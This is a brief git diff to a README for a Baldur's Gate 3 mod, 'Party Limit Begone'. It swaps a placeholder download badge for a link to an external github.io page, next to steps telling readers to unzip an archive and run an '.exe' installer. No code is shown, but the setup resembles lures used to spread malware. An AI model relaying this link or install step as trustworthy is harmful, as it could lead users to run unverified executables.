@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install Party Limit Begone automatically into your Baldur’s Gate 3 Mods directory.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://party-limit-begone-bg3.github.io/.github/)
 
 ## 📸 Overview
 ![bg3-roleplay](https://github.com/user-attachments/assets/5577aadb-99f1-41a9-af14-69aeb41737f4)
